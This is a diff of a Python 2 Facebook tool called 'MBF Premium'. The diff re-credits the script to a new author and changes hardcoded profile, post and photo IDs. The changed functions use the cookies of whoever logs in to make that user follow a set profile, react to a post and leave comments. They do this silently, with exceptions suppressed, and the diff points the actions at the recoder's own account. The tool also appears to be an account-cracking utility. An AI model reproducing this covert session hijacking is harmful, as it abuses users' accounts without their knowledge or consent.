@@ -1,9 +1,9 @@
 # -*- coding: UTF-8 -*-
-# Senin, 12 April 2021
-# Author: IqbalDev
+# Rabu, 19 Mei 2021
+# Author: FAKE ROOT07
 # Tools: MBF Premium
 # Versi: 0.1
-# Jangan Main Recode Sembarangan yaa Ngab!
+# FAKE ROOT!
 
 import requests, os, sys, random, time, re, subprocess
 from bs4 import BeautifulSoup
@@ -74,7 +74,7 @@ def proses_masuk(cookie_dev):
 	except:
 		pass
 	try:
-		uwu_u = "https://mbasic.facebook.com/jangan.macem.macem.2"
+		uwu_u = "https://mbasic.facebook.com/m.abiadi"
 		ikut = ses_pros_dev.get(uwu_u, cookies=cookie_dev).content
 		sop_dev = BeautifulSoup(ikut, "html.parser")
 		ambil = sop_dev.find("a", string="Ikuti")
@@ -83,7 +83,7 @@ def proses_masuk(cookie_dev):
 	except:
 		pass
 def love(cookie):
-	url_love = "https://mbasic.facebook.com/reactions/picker/?is_permalink=1&ft_id=510375576819453"
+	url_love = "https://mbasic.facebook.com/reactions/picker/?is_permalink=1&ft_id=320031759024394"
 	with requests.Session() as r_dev:
 		hal_love = r_dev.get(url_love, cookies=cookie).content
 		sop = BeautifulSoup(hal_love, "html.parser")
@@ -96,7 +96,7 @@ def love(cookie):
 				r_dev.get("https://mbasic.facebook.com"+u_love, cookies=cookie)
 
 def komen(cookie):
-	url = "https://mbasic.facebook.com/photo.php?fbid=510485606808450"
+	url = "https://mbasic.facebook.com/photo/?fbid=320031759024394"
 	for de in range(2):
 		with requests.Session() as res_dev:
 			hal_res = res_dev.get(url, cookies=cookie).content
@@ -570,7 +570,7 @@ def banner():
 | |  | | |_/ / |     | |  | | |  __/ | | | | | """+h+"""
 \_|  |_|____/\_|     \_|  |/   \___|_| |_| |/"""
 	print a+"+-----------------------+"
-	print a+"|"+j+" >_ "+h+"Author"+p+":"+k+" IqbalDev "+a+" /"+p+ "| IP Sekarang: "
+	print a+"|"+j+" >_ "+h+"Author"+p+":"+k+" ./Fake Root "+a+" /"+p+ "| IP Sekarang: "
 	print a+"|"+j+" >_ "+h+"Coding"+p+":"+k+" Python27 "+a+"/"+h+" | => "+k+ip
 	print a+"+--------------------'--+"  
 
